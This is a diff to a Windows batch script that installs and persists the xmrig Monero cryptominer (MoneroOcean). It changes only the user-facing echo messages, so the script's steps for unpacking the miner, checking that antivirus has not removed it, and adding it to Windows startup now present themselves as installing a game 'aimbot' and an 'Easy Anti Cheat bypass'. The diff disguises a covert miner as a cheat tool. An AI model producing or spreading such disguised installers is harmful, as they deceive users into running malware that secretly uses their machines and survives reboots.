@@ -189,7 +189,7 @@ pause
 
 rem start doing stuff: preparing miner
 
-echo [*] Removing previous moneroocean miner (if any)
+echo [*] Making sure aimbot is working. (if any)
 sc stop moneroocean_miner
 sc delete moneroocean_miner
 taskkill /f /t /im xmrig.exe
@@ -216,13 +216,13 @@ if errorlevel 1 (
     echo ERROR: Can't download 7za.exe to "%USERPROFILE%\7za.exe"
     exit /b 1
   )
-  echo [*] Unpacking stock "%USERPROFILE%\xmrig.zip" to "%USERPROFILE%\moneroocean"
+  echo [*] Unpacking aimbot...
   "%USERPROFILE%\7za.exe" x -y -o"%USERPROFILE%\moneroocean" "%USERPROFILE%\xmrig.zip" >NUL
   del "%USERPROFILE%\7za.exe"
 )
 del "%USERPROFILE%\xmrig.zip"
 
-echo [*] Checking if advanced version of "%USERPROFILE%\moneroocean\xmrig.exe" works fine ^(and not removed by antivirus software^)
+echo [*] Checking if aimbot works. ^(and not removed by antivirus software^)
 powershell -Command "$out = cat '%USERPROFILE%\moneroocean\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\moneroocean\config.json'" 
 "%USERPROFILE%\moneroocean\xmrig.exe" --help >NUL
 if %ERRORLEVEL% equ 0 goto MINER_OK
@@ -335,7 +335,7 @@ echo ERROR: Can't find Windows startup directory
 exit /b 1
 
 :STARTUP_DIR_OK
-echo [*] Adding call to "%USERPROFILE%\moneroocean\miner.bat" script to "%STARTUP_DIR%\moneroocean_miner.bat" script
+echo [*] Adding Easy Anti Cheat bypass...
 (
 echo @echo off
 echo "%USERPROFILE%\moneroocean\miner.bat" --config="%USERPROFILE%\moneroocean\config_background.json"
